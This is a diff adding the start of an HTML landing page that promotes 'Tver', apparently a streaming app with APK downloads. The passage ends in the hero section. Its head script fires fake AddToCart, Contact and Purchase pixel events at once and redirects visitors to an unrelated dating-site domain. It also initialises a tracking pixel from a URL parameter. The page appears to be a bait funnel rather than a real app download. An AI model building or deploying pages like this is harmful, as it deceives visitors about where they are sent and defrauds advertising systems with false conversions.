@@ -1,0 +1,1525 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+
+
+   
+	<script>
+!function(f,b,e,v,n,t,s) {
+    if(f.fbq) return;
+    n=f.fbq=function(){
+        n.callMethod ? n.callMethod.apply(n,arguments) : n.queue.push(arguments)
+    };
+    if(!f._fbq) f._fbq=n;
+    n.push=n;
+    n.loaded=!0;
+    n.version='2.0';
+    n.queue=[];
+
+    t=b.createElement(e);
+    t.async=!0;
+    t.src=v;
+    s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)
+}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
+
+// 提取 URL 中的 fbid 参数
+function getQueryParam(param) {
+    var urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(param);
+}
+
+var fbid = getQueryParam('fbid');
+if (fbid) {
+    fbq('init', fbid);
+    fbq('track', 'PageView');
+}
+</script>
+	
+	
+       <script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1608526056916699');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1608526056916699&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+   <script>
+// ========== k2 — 核心跳转方法 ==========
+function k2(){
+     	fbq('track', 'AddToCart');
+		 fbq('track', 'Contact');
+    fbq('track', 'Purchase');
+   window.location.href='https://125szk3lemwm.datingrealmx.com/c5rghPKunI'
+}
+</script>
+
+
+
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
+<title>Tver — Cine en tu Bolsillo</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+/* ============================================================
+   RESET & BASE
+   ============================================================ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{
+  scroll-behavior:smooth;
+  -webkit-text-size-adjust:100%;
+  -webkit-tap-highlight-color:transparent;
+  overflow-x:hidden;
+}
+body{
+  font-family:'Inter',system-ui,-apple-system,sans-serif;
+  background:#020203;
+  color:#EDEDEF;
+  line-height:1.5;
+  -webkit-font-smoothing:antialiased;
+  overscroll-behavior-y:auto;
+  overflow-x:hidden;
+  overflow-y:auto;
+  -webkit-overflow-scrolling:touch;
+  max-width:100vw;
+}
+img,svg{display:block;max-width:100%}
+button{font:inherit;cursor:pointer;border:none;outline:none;background:none;color:inherit}
+a{color:inherit;text-decoration:none}
+
+/* ============================================================
+   DESIGN TOKENS
+   ============================================================ */
+:root{
+  --bg-void:#020203;
+  --bg-base:#050506;
+  --bg-elevated:#0a0a0c;
+  --bg-card:rgba(255,255,255,0.03);
+  --bg-card-hover:rgba(255,255,255,0.05);
+  --surface:rgba(255,255,255,0.04);
+  --surface-border:rgba(255,255,255,0.06);
+  --fg:#EDEDEF;
+  --fg-dim:#8A8F98;
+  --fg-muted:#5C6068;
+  --accent:#E11D48;
+  --accent-glow:rgba(225,29,72,0.25);
+  --accent-2:#7C3AED;
+  --accent-2-glow:rgba(124,58,237,0.2);
+  --cyan:#06B6D4;
+  --cyan-glow:rgba(6,182,212,0.15);
+  --gold:#EAB308;
+  --gold-glow:rgba(234,179,8,0.15);
+  --green:#22C55E;
+  --radius-sm:10px;
+  --radius:16px;
+  --radius-lg:20px;
+  --radius-xl:24px;
+  --radius-full:9999px;
+  --ease-out:cubic-bezier(0.16,1,0.3,1);
+  --ease-spring:cubic-bezier(0.34,1.56,0.64,1);
+}
+
+/* ============================================================
+   AMBIENT BACKGROUND ORBS
+   ============================================================ */
+.ambient-orbs{
+  position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden;
+}
+.orb{
+  position:absolute;border-radius:50%;filter:blur(80px);opacity:0.5;
+  animation:orbFloat 12s ease-in-out infinite;
+}
+.orb-1{
+  width:260px;height:260px;
+  background:radial-gradient(circle,rgba(225,29,72,0.18),transparent 70%);
+  top:5%;left:-15%;
+  animation-delay:0s;
+}
+.orb-2{
+  width:200px;height:200px;
+  background:radial-gradient(circle,rgba(124,58,237,0.16),transparent 70%);
+  top:40%;right:-10%;
+  animation-delay:-4s;
+}
+.orb-3{
+  width:180px;height:180px;
+  background:radial-gradient(circle,rgba(6,182,212,0.12),transparent 70%);
+  top:70%;left:10%;
+  animation-delay:-8s;
+}
+.orb-4{
+  width:150px;height:150px;
+  background:radial-gradient(circle,rgba(234,179,8,0.1),transparent 70%);
+  top:85%;right:20%;
+  animation-delay:-6s;
+}
+@keyframes orbFloat{
+  0%,100%{transform:translate(0,0) scale(1)}
+  25%{transform:translate(30px,-20px) scale(1.1)}
+  50%{transform:translate(-15px,25px) scale(0.9)}
+  75%{transform:translate(-25px,-15px) scale(1.05)}
+}
+
+/* ============================================================
+   CONTENT WRAPPER (above orbs)
+   ============================================================ */
+.page-content{position:relative;z-index:2}
+
+/* ============================================================
+   GLASS CARD BASE
+   ============================================================ */
+.glass{
+  background:var(--bg-card);
+  border:1px solid var(--surface-border);
+  backdrop-filter:blur(20px);
+  -webkit-backdrop-filter:blur(20px);
+}
+
+/* ============================================================
+   SECTION
+   ============================================================ */
+.section{padding:32px 16px;position:relative}
+.section-label{
+  display:inline-flex;align-items:center;gap:6px;
+  font-size:0.6875rem;font-weight:600;letter-spacing:0.08em;
+  text-transform:uppercase;color:var(--accent);
+  margin-bottom:10px;
+}
+.section-label::before{
+  content:'';width:6px;height:6px;border-radius:50%;
+  background:var(--accent);
+  box-shadow:0 0 8px var(--accent-glow);
+}
+.section-title{
+  font-family:'Space Grotesk',sans-serif;
+  font-size:1.5rem;font-weight:700;line-height:1.15;letter-spacing:-0.02em;
+  margin-bottom:4px;
+}
+.section-sub{font-size:0.8125rem;color:var(--fg-dim);line-height:1.5}
+
+/* ============================================================
+   HERO — Screen 1
+   ============================================================ */
+.hero{
+  position:relative;z-index:2;
+  min-height:100vh;min-height:100dvh;
+  display:flex;flex-direction:column;justify-content:center;
+  padding:20px 16px 60px;
+}
+.hero-eyebrow{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:6px 14px;border-radius:var(--radius-full);
+  background:rgba(255,255,255,0.04);
+  border:1px solid rgba(255,255,255,0.06);
+  font-size:0.75rem;font-weight:500;color:var(--fg-dim);
+  margin-bottom:20px;
+  width:fit-content;
+}
+.hero-eyebrow-dot{
+  width:7px;height:7px;border-radius:50%;
+  background:var(--green);
+  box-shadow:0 0 8px rgba(34,197,94,0.5);
+  animation:pulse 2s ease-in-out infinite;
+}
+@keyframes pulse{
+  0%,100%{opacity:1}
+  50%{opacity:0.4}
+}
+.hero-title{
+  font-family:'Space Grotesk',sans-serif;
+  font-size:clamp(1.75rem,8vw,2.75rem);font-weight:800;line-height:1.1;letter-spacing:-0.03em;
+  margin-bottom:8px;
+  white-space:nowrap;
+}
+.hero-title .hl{color:var(--accent);position:relative}
+.hero-title .hl::after{
+  content:'';position:absolute;bottom:2px;left:0;right:0;height:3px;
+  background:var(--accent);opacity:0.3;border-radius:2px;
+}
+.hero-desc{
+  font-size:0.875rem;color:var(--fg-dim);line-height:1.55;margin-bottom:24px;
+  max-width:300px;
+}
+
+/* Hero stat badges */
+.hero-badges{
+  display:flex;gap:8px;margin-bottom:32px;
+}
+.hero-badge{
+  display:flex;align-items:center;gap:6px;
+  padding:8px 12px;border-radius:var(--radius);
+  background:var(--bg-card);border:1px solid var(--surface-border);
+  backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);
+  flex:1;min-width:0;justify-content:center;
+}
+.hero-badge-icon{
+  width:30px;height:30px;min-width:30px;border-radius:var(--radius-sm);
+  display:flex;align-items:center;justify-content:center;
+}
+.hero-badge-icon.red{background:rgba(225,29,72,0.12);color:var(--accent)}
+.hero-badge-icon.purple{background:rgba(124,58,237,0.12);color:var(--accent-2)}
+.hero-badge-icon.cyan{background:rgba(6,182,212,0.12);color:var(--cyan)}
+.hero-badge-icon svg{width:16px;height:16px}
+.hero-badge-num{font-size:0.9375rem;font-weight:700;line-height:1;white-space:nowrap}
+.hero-badge-label{font-size:0.625rem;color:var(--fg-muted);margin-top:1px;white-space:nowrap}
+
+/* Hero visual — floating card cluster */
+.hero-visual{
+  position:relative;height:220px;margin-bottom:20px;
+}
+.hero-float-card{
+  position:absolute;
+  background:rgba(255,255,255,0.04);
+  border:1px solid rgba(255,255,255,0.08);
+  border-radius:var(--radius-lg);
+  backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);
+  overflow:hidden;
+}
+.hero-float-card img{display:block;width:100%;height:100%;object-fit:contain}
+.hero-float-card.c1{
+  width:110px;height:165px;top:-10px;left:5px;
+  transform:rotate(-3deg);
+  z-index:3;
+  animation:floatCard1 6s ease-in-out infinite;
+}
+.hero-float-card.c2{
+  width:95px;height:142px;top:25px;right:10px;
+  transform:rotate(4deg);
+  z-index:2;
+  animation:floatCard2 7s ease-in-out infinite;
+}
+.hero-float-card.c3{
+  width:120px;height:180px;bottom:5px;left:50px;
+  transform:rotate(-2deg);
+  z-index:4;
+  animation:floatCard3 8s ease-in-out infinite;
+}
+@keyframes floatCard1{
+  0%,100%{transform:rotate(-3deg) translateY(0)}
+  50%{transform:rotate(-2deg) translateY(-10px)}
+}
+@keyframes floatCard2{
+  0%,100%{transform:rotate(4deg) translateY(0)}
+  50%{transform:rotate(3deg) translateY(-6px)}
+}
+@keyframes floatCard3{
+  0%,100%{transform:rotate(-2deg) translateY(0)}
+  50%{transform:rotate(-1deg) translateY(-8px)}
+}
+.float-card-inner{
+  width:100%;height:100%;
+  background:linear-gradient(135deg,rgba(225,29,72,0.08) 0%,rgba(124,58,237,0.06) 50%,rgba(6,182,212,0.04) 100%);
+  display:flex;align-items:center;justify-content:center;
+  position:relative;
+}
+.float-card-play{
+  width:40px;height:40px;border-radius:50%;
+  background:var(--accent);
+  display:flex;align-items:center;justify-content:center;
+  box-shadow:0 0 30px var(--accent-glow);
+}
+.float-card-play svg{width:16px;height:16px;color:#fff;margin-left:2px}
+
+/* Hero CTA button */
+.hero-cta{
+  display:flex;align-items:center;justify-content:center;gap:10px;
+  width:100%;min-height:54px;
+  border-radius:var(--radius-full);
+  background:linear-gradient(135deg,var(--accent),#C01B3F);
+  color:#fff;font-size:1rem;font-weight:700;
+  box-shadow:0 8px 32px var(--accent-glow),0 0 0 4px rgba(225,29,72,0.08);
+  transition:all 0.2s var(--ease-out);
+  position:relative;overflow:hidden;
+}
+.hero-cta::after{
+  content:'';position:absolute;inset:0;
+  background:linear-gradient(135deg,transparent 0%,rgba(255,255,255,0.1) 50%,transparent 100%);
+  transform:translateX(-100%);
+  transition:transform 0.6s;
+}
+.hero-cta:active::after{transform:translateX(100%)}
+.hero-cta:active{transform:scale(0.97);box-shadow:0 4px 16px var(--accent-glow)}
+.hero-cta svg{width:20px;height:20px;flex-shrink:0}
+.hero-trust{
+  text-align:center;margin-top:10px;
+  font-size:0.6875rem;color:var(--fg-muted);
+}
+
+/* ============================================================
+   SCROLL HINT
+   ============================================================ */
+.scroll-hint{
+  display:flex;flex-direction:column;align-items:center;gap:6px;
+  position:absolute;bottom:16px;left:50%;transform:translateX(-50%);
+  z-index:2;opacity:0.5;
+}
+.scroll-hint span{font-size:0.625rem;letter-spacing:0.06em;text-transform:uppercase;color:var(--fg-muted)}
+.scroll-hint-line{
+  width:1px;height:24px;
+  background:linear-gradient(to bottom,var(--fg-dim),transparent);
+  animation:scrollPulse 2s ease-in-out infinite;
+}
+@keyframes scrollPulse{
+  0%,100%{opacity:0.3;transform:scaleY(0.6)}
+  50%{opacity:1;transform:scaleY(1)}
+}
+
+/* ============================================================
+   TRENDING CARDS — Screen 2
+   ============================================================ */
+.trending-scroll{
+  display:flex;gap:10px;overflow-x:auto;
+  scroll-snap-type:x mandatory;
+  -webkit-overflow-scrolling:touch;
+  scrollbar-width:none;
+  padding:0 16px;margin:0 -16px;
+  padding-right:calc(16px + 60px); /* peek effect */
+}
+.trending-scroll::-webkit-scrollbar{display:none}
+.trending-card{
+  flex:0 0 148px;scroll-snap-align:start;
+  border-radius:var(--radius);
+  overflow:hidden;position:relative;
+  background:var(--bg-elevated);
+  border:1px solid var(--surface-border);
+  aspect-ratio:2/3;
+  transition:transform 0.2s var(--ease-out);
+}
+.trending-card:active{transform:scale(0.96)}
+.trending-card-media{
+  width:100%;height:100%;position:relative;
+  display:flex;align-items:center;justify-content:center;
+}
+.trending-card-rank{
+  position:absolute;top:-4px;left:8px;
+  font-family:'Space Grotesk',sans-serif;
+  font-size:3rem;font-weight:800;color:rgba(255,255,255,0.06);
+  pointer-events:none;line-height:1;z-index:1;
+}
+.trending-play-btn{
+  position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
+  width:48px;height:48px;min-width:48px;min-height:48px;
+  border-radius:50%;
+  background:rgba(225,29,72,0.9);
+  backdrop-filter:blur(8px);
+  -webkit-backdrop-filter:blur(8px);
+  display:flex;align-items:center;justify-content:center;
+  box-shadow:0 4px 24px rgba(0,0,0,0.5),0 0 0 4px rgba(225,29,72,0.2);
+  z-index:5;opacity:0;
+  transition:opacity 0.25s var(--ease-out),transform 0.25s var(--ease-out);
+  cursor:pointer;
+  -webkit-tap-highlight-color:transparent;
+}
+.trending-play-btn svg{width:18px;height:18px;color:#fff;margin-left:3px}
+.trending-play-btn{opacity:0.85}
+.trending-card:active .trending-play-btn,
+.trending-card:hover .trending-play-btn{opacity:1}
+.trending-play-btn:active{transform:translate(-50%,-50%) scale(0.9);opacity:1}
+.trending-card-label{
+  position:absolute;top:10px;left:10px;
+  padding:3px 8px;border-radius:4px;
+  font-size:0.625rem;font-weight:700;letter-spacing:0.03em;
+}
+.trending-card-label.hot{background:var(--accent);color:#fff}
+.trending-card-label.new{background:var(--accent-2);color:#fff}
+.trending-card-label.top{background:var(--gold);color:#000}
+.trending-card-info{
+  position:absolute;bottom:0;left:0;right:0;
+  padding:30px 10px 10px;
+  background:linear-gradient(transparent,rgba(0,0,0,0.85));
+}
+.trending-card-title{
+  font-size:0.8125rem;font-weight:700;line-height:1.2;
+}
+.trending-card-meta{
+  display:flex;align-items:center;gap:4px;margin-top:3px;
+  font-size:0.6875rem;color:var(--fg-dim);
+}
+.trending-card-meta svg{width:11px;height:11px;color:var(--gold)}
+
+/* Category pills */
+.cat-pills{
+  display:flex;flex-wrap:wrap;gap:7px;margin-top:20px;
+}
+.cat-pill{
+  padding:7px 15px;border-radius:var(--radius-full);
+  font-size:0.75rem;font-weight:500;
+  background:var(--bg-card);border:1px solid var(--surface-border);
+  color:var(--fg-dim);transition:all 0.2s;white-space:nowrap;
+}
+.cat-pill.on{background:var(--accent);border-color:var(--accent);color:#fff;box-shadow:0 4px 16px var(--accent-glow)}
+
+/* ============================================================
+   LIVE STATS BAR
+   ============================================================ */
+.live-bar{
+  display:flex;justify-content:space-between;align-items:center;
+  padding:14px 16px;margin-top:20px;
+  border-radius:var(--radius);
+  background:linear-gradient(135deg,rgba(225,29,72,0.04),rgba(124,58,237,0.03));
+  border:1px solid var(--surface-border);
+}
+.live-stat{text-align:center;flex:1}
+.live-stat-val{
+  font-family:'Space Grotesk',sans-serif;
+  font-size:1.25rem;font-weight:700;letter-spacing:-0.02em;
+}
+.live-stat-val.red{color:var(--accent)}
+.live-stat-val.purple{color:#A78BFA}
+.live-stat-val.cyan{color:var(--cyan)}
+.live-stat-lbl{font-size:0.625rem;color:var(--fg-muted);margin-top:1px}
+.live-divider{width:1px;height:28px;background:var(--surface-border)}
+
+/* ============================================================
+   FEATURES — Screen 3
+   ============================================================ */
+.feat-grid{
+  display:grid;grid-template-columns:1fr 1fr;gap:10px;
+}
+.feat-card{
+  padding:18px 14px;border-radius:var(--radius);
+  background:var(--bg-card);border:1px solid var(--surface-border);
+  position:relative;overflow:hidden;
+  transition:all 0.2s var(--ease-out);
+}
+.feat-card:active{background:var(--bg-card-hover);border-color:rgba(255,255,255,0.1)}
+.feat-card::after{
+  content:'';position:absolute;top:-20px;right:-20px;
+  width:60px;height:60px;border-radius:50%;
+  opacity:0.06;pointer-events:none;
+}
+.feat-card:nth-child(1)::after{background:var(--accent)}
+.feat-card:nth-child(2)::after{background:var(--accent-2)}
+.feat-card:nth-child(3)::after{background:var(--cyan)}
+.feat-card:nth-child(4)::after{background:var(--gold)}
+.feat-icon{
+  width:42px;height:42px;border-radius:var(--radius-sm);
+  display:flex;align-items:center;justify-content:center;
+  margin-bottom:10px;
+}
+.feat-icon.r{background:rgba(225,29,72,0.1);color:var(--accent)}
+.feat-icon.p{background:rgba(124,58,237,0.1);color:var(--accent-2)}
+.feat-icon.c{background:rgba(6,182,212,0.1);color:var(--cyan)}
+.feat-icon.g{background:rgba(234,179,8,0.1);color:var(--gold)}
+.feat-icon svg{width:20px;height:20px}
+.feat-card h4{font-size:0.875rem;font-weight:600;margin-bottom:2px}
+.feat-card p{font-size:0.75rem;color:var(--fg-dim);line-height:1.45}
+
+/* ============================================================
+   DEVICE STRIP
+   ============================================================ */
+.device-strip{
+  display:flex;justify-content:center;gap:28px;align-items:center;
+  padding:16px 0;margin-top:8px;
+}
+.device-item{display:flex;flex-direction:column;align-items:center;gap:5px;color:var(--fg-muted)}
+.device-item svg{width:24px;height:24px;opacity:0.5}
+.device-item span{font-size:0.625rem}
+
+/* ============================================================
+   BIG FEATURE CARD — asymmetrical accent
+   ============================================================ */
+.big-feat{
+  margin-top:14px;border-radius:var(--radius-lg);
+  padding:24px 20px;position:relative;overflow:hidden;
+  background:linear-gradient(145deg,rgba(124,58,237,0.08),rgba(225,29,72,0.04));
+  border:1px solid rgba(124,58,237,0.15);
+}
+.big-feat-glow{
+  position:absolute;top:-30px;right:-30px;
+  width:120px;height:120px;border-radius:50%;
+  background:radial-gradient(circle,rgba(124,58,237,0.2),transparent 70%);
+  pointer-events:none;
+}
+.big-feat h3{
+  font-family:'Space Grotesk',sans-serif;
+  font-size:1.25rem;font-weight:700;margin-bottom:12px;
+  position:relative;
+}
+.big-feat-list{list-style:none;display:flex;flex-direction:column;gap:10px;position:relative}
+.big-feat-list li{
+  display:flex;align-items:flex-start;gap:10px;
+  font-size:0.8125rem;color:var(--fg-dim);line-height:1.45;
+}
+.big-feat-list li svg{width:16px;height:16px;color:var(--accent-2);flex-shrink:0;margin-top:1px}
+
+/* ============================================================
+   SOCIAL PROOF — Screen 4
+   ============================================================ */
+.reviews-wrap{
+  display:flex;gap:12px;overflow-x:auto;
+  scroll-snap-type:x mandatory;
+  -webkit-overflow-scrolling:touch;
+  scrollbar-width:none;
+  padding:0 16px;margin:0 -16px;
+  padding-right:calc(16px + 60px);
+}
+.reviews-wrap::-webkit-scrollbar{display:none}
+.review-card{
+  flex:0 0 270px;scroll-snap-align:start;
+  padding:20px;border-radius:var(--radius-lg);
+  background:var(--bg-card);border:1px solid var(--surface-border);
+  position:relative;
+}
+.review-card::before{
+  content:'"';position:absolute;top:12px;right:16px;
+  font-family:'Space Grotesk',serif;
+  font-size:3rem;font-weight:700;color:rgba(255,255,255,0.03);
+  line-height:1;pointer-events:none;
+}
+.review-stars{display:flex;gap:3px;margin-bottom:10px}
+.review-stars svg{width:14px;height:14px;color:var(--gold)}
+.review-body{font-size:0.8125rem;color:var(--fg-dim);line-height:1.55;font-style:italic;margin-bottom:14px}
+.review-author{display:flex;align-items:center;gap:10px}
+.review-avatar{
+  width:34px;height:34px;border-radius:50%;
+  background:linear-gradient(135deg,var(--accent-2),var(--accent));
+  display:flex;align-items:center;justify-content:center;
+  font-size:0.75rem;font-weight:700;
+}
+.review-name{font-size:0.8125rem;font-weight:600}
+.review-role{font-size:0.6875rem;color:var(--fg-muted)}
+
+/* ============================================================
+   GLOBAL STATS
+   ============================================================ */
+.global-stats{
+  display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:20px;
+}
+.global-stat{
+  padding:18px 16px;border-radius:var(--radius);
+  background:var(--bg-card);border:1px solid var(--surface-border);
+  text-align:center;
+}
+.global-stat-num{
+  font-family:'Space Grotesk',sans-serif;
+  font-size:1.75rem;font-weight:800;letter-spacing:-0.03em;
+}
+.global-stat-num.a{background:linear-gradient(135deg,var(--accent),#FB7185);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.global-stat-num.b{background:linear-gradient(135deg,var(--accent-2),#A78BFA);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.global-stat-num.c{background:linear-gradient(135deg,var(--cyan),#67E8F9);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.global-stat-num.d{background:linear-gradient(135deg,var(--gold),#FDE047);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.global-stat-lbl{font-size:0.6875rem;color:var(--fg-muted);margin-top:3px}
+
+/* ============================================================
+   DOWNLOAD AREA — Screen 5
+   ============================================================ */
+.download-section{
+  padding:40px 16px 100px;text-align:center;position:relative;
+}
+.download-glow{
+  position:absolute;top:20%;left:50%;transform:translateX(-50%);
+  width:280px;height:280px;border-radius:50%;
+  background:radial-gradient(circle,rgba(225,29,72,0.12),transparent 70%);
+  pointer-events:none;
+}
+.download-title{
+  font-family:'Space Grotesk',sans-serif;
+  font-size:1.75rem;font-weight:800;letter-spacing:-0.03em;
+  position:relative;
+}
+.download-title .ac{color:var(--accent)}
+.download-desc{
+  font-size:0.875rem;color:var(--fg-dim);margin:8px auto 24px;max-width:260px;
+  position:relative;
+}
+.download-btns{display:flex;flex-direction:column;gap:10px;max-width:280px;margin:0 auto 20px;position:relative}
+.store-btn{
+  display:flex;align-items:center;justify-content:center;gap:10px;
+  min-height:50px;border-radius:var(--radius-full);
+  font-size:0.9375rem;font-weight:600;
+  transition:all 0.2s var(--ease-out);
+}
+.store-btn:active{transform:scale(0.96)}
+.store-btn.apk{
+  background:linear-gradient(135deg,var(--accent),#C01B3F);color:#fff;
+  box-shadow:0 6px 24px var(--accent-glow);
+}
+.store-btn.apk2{
+  background:rgba(255,255,255,0.06);color:var(--fg);
+  border:1px solid rgba(255,255,255,0.1);
+}
+.store-btn svg{width:22px;height:22px;flex-shrink:0}
+.store-btn-label{text-align:left;line-height:1.2}
+.store-btn-label small{font-size:0.625rem;font-weight:400;display:block}
+.qr-wrap{
+  display:inline-block;padding:10px;border-radius:var(--radius);
+  background:#fff;position:relative;
+}
+.qr-wrap svg{display:block}
+.qr-label{font-size:0.6875rem;color:var(--fg-muted);margin-top:10px;position:relative}
+
+/* ============================================================
+   FOOTER
+   ============================================================ */
+.page-footer{
+  text-align:center;padding:16px;font-size:0.6875rem;color:var(--fg-muted);
+  border-top:1px solid rgba(255,255,255,0.03);
+  position:relative;z-index:2;
+}
+
+/* ============================================================
+   APK SECURITY SECTION
+   ============================================================ */
+.security-strip{
+  display:flex;flex-wrap:wrap;gap:10px;margin-top:20px;
+}
+.security-item{
+  flex:1;min-width:calc(50% - 5px);
+  display:flex;align-items:center;gap:10px;
+  padding:14px;
+  border-radius:var(--radius);
+  background:var(--bg-card);border:1px solid var(--surface-border);
+}
+.security-item-icon{
+  width:38px;height:38px;min-width:38px;
+  border-radius:var(--radius-sm);
+  display:flex;align-items:center;justify-content:center;
+  background:rgba(34,197,94,0.1);color:var(--green);
+}
+.security-item-icon svg{width:18px;height:18px}
+.security-item-text{font-size:0.75rem;font-weight:500;line-height:1.35}
+.security-item-text span{display:block;font-size:0.625rem;color:var(--fg-muted);font-weight:400;margin-top:1px}
+
+/* ============================================================
+   FAQ ACCORDION
+   ============================================================ */
+.faq-list{display:flex;flex-direction:column;gap:6px}
+.faq-item{
+  border-radius:var(--radius);
+  background:var(--bg-card);border:1px solid var(--surface-border);
+  overflow:hidden;transition:all 0.2s var(--ease-out);
+}
+.faq-item.open{background:var(--bg-card-hover);border-color:rgba(255,255,255,0.1)}
+.faq-q{
+  display:flex;align-items:center;justify-content:space-between;gap:12px;
+  padding:16px;font-size:0.875rem;font-weight:600;
+  cursor:pointer;user-select:none;
+  -webkit-tap-highlight-color:transparent;
+  min-height:50px;
+}
+.faq-q-arrow{
+  width:22px;height:22px;min-width:22px;
+  border-radius:50%;
+  background:rgba(255,255,255,0.04);
+  display:flex;align-items:center;justify-content:center;
+  transition:transform 0.25s var(--ease-out);
+}
+.faq-item.open .faq-q-arrow{transform:rotate(180deg);background:var(--accent)}
+.faq-q-arrow svg{width:12px;height:12px;color:var(--fg-dim);transition:color 0.2s}
+.faq-item.open .faq-q-arrow svg{color:#fff}
+.faq-a{
+  max-height:0;overflow:hidden;
+  transition:max-height 0.35s var(--ease-out),padding 0.35s var(--ease-out);
+}
+.faq-item.open .faq-a{max-height:300px}
+.faq-a-inner{
+  padding:0 16px 16px;
+  font-size:0.8125rem;color:var(--fg-dim);line-height:1.6;
+}
+
+/* ============================================================
+   STICKY FLOATING DOWNLOAD BUTTON
+   ============================================================ */
+.float-bar{
+  position:fixed;bottom:0;left:0;right:0;z-index:100;
+  padding:10px 16px max(10px,env(safe-area-inset-bottom));
+  background:linear-gradient(0deg,rgba(2,2,3,0.98) 0%,rgba(2,2,3,0.85) 80%,transparent 100%);
+  backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
+  transform:translateY(100%);
+  transition:transform 0.4s var(--ease-out),pointer-events 0s 0.4s;
+  pointer-events:none;
+  display:flex;align-items:center;
+}
+.float-bar.on{transform:translateY(0);pointer-events:auto;transition:transform 0.4s var(--ease-out),pointer-events 0s 0s}
+.float-bar-cta{
+  flex:1;min-height:52px;
+  border-radius:var(--radius-full);
+  background:linear-gradient(135deg,var(--accent),#C01B3F);
+  color:#fff;font-size:1rem;font-weight:700;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  box-shadow:0 6px 24px var(--accent-glow);
+  transition:all 0.15s var(--ease-out);
+  animation:btnPulse 3s ease-in-out infinite;
+}
+@keyframes btnPulse{
+  0%,100%{box-shadow:0 6px 24px var(--accent-glow)}
+  50%{box-shadow:0 8px 36px rgba(225,29,72,0.35)}
+}
+.float-bar-cta:active{transform:scale(0.97)}
+.float-bar-cta svg{width:18px;height:18px}
+
+/* ============================================================
+   SCROLL REVEAL
+   ============================================================ */
+.reveal{opacity:0;transform:translateY(16px);transition:opacity 0.55s var(--ease-out),transform 0.55s var(--ease-out)}
+.reveal.visible{opacity:1;transform:translateY(0)}
+
+/* ============================================================
+   REDUCED MOTION
+   ============================================================ */
+@media(prefers-reduced-motion:reduce){
+  *,*::before,*::after{
+    animation-duration:0.01ms!important;animation-iteration-count:1!important;
+    transition-duration:0.01ms!important
+  }
+}
+
+/* ============================================================
+   LANGUAGE SWITCHER
+   ============================================================ */
+.lang-float{
+  position:fixed;top:12px;right:12px;z-index:200;
+  display:flex;align-items:center;gap:8px;
+  background:rgba(255,255,255,0.06);
+  border:1px solid rgba(255,255,255,0.15);
+  border-radius:30px;padding:4px 5px 4px 14px;
+  backdrop-filter:blur(16px);
+  -webkit-backdrop-filter:blur(16px);
+  box-shadow:0 2px 12px rgba(0,0,0,0.3);
+}
+.lang-float-icon{font-size:1.1rem;line-height:1;flex-shrink:0}
+.lang-float a{
+  text-decoration:none;
+  padding:8px 16px;border-radius:30px;
+  font-size:0.75rem;font-weight:700;letter-spacing:0.02em;
+  color:var(--fg-muted);
+  transition:all 0.2s var(--ease-out);
+}
+.lang-float a.active{
+  background:var(--accent);color:#fff;
+  box-shadow:0 2px 10px var(--accent-glow);
+}
+.lang-float a:hover{color:var(--fg)}
+</style>
+</head>
+<body>
+
+<!-- Language Switcher -->
+<div class="lang-float">
+  <span class="lang-float-icon">🌐</span>
+  <a href="index.html" data-lang="en" aria-label="English">English</a>
+  <a href="estv.html" class="active" data-lang="es" aria-label="Español">Español</a>
+</div>
+
+<!-- Ambient background orbs -->
+<div class="ambient-orbs">
+  <div class="orb orb-1"></div>
+  <div class="orb orb-2"></div>
+  <div class="orb orb-3"></div>
+  <div class="orb orb-4"></div>
+</div>
+
+<!-- Page content -->
+<div class="page-content">
+
+<!-- ============================================================
+     SCREEN 1: HERO
+     ============================================================ -->
+<section class="hero">
+  <div class="hero-eyebrow">
+    <span class="hero-eyebrow-dot"></span>
+    <span data-i18n="hero_eyebrow">#1 Entertainment App · 2026</span>
+  </div>
+
+  <h1 class="hero-title">
+    <span data-i18n="hero_title_a">Cinema in your</span> <span class="hl" data-i18n="hero_title_b">pocket</span>
+  </h1>
+  <p class="hero-desc" data-i18n="hero_desc">Stream blockbusters, binge series, download for offline — all in stunning 4K HDR. No ads. Ever.</p>
+
+  <!-- Floating card visual -->
+  <div class="hero-visual">
+    <div class="hero-float-card c1">
+      <img src="img/1a.jpg" alt="Movie poster 1">
+    </div>
+    <div class="hero-float-card c2">
+      <img src="img/2a.jpg" alt="Movie poster 2">
+    </div>
+    <div class="hero-float-card c3">
+      <img src="img/3a.jpg" alt="Movie poster 3">
+    </div>
+  </div>
+
+  <!-- Stat badges -->
+  <div class="hero-badges">
+    <div class="hero-badge">
+      <div class="hero-badge-icon red">
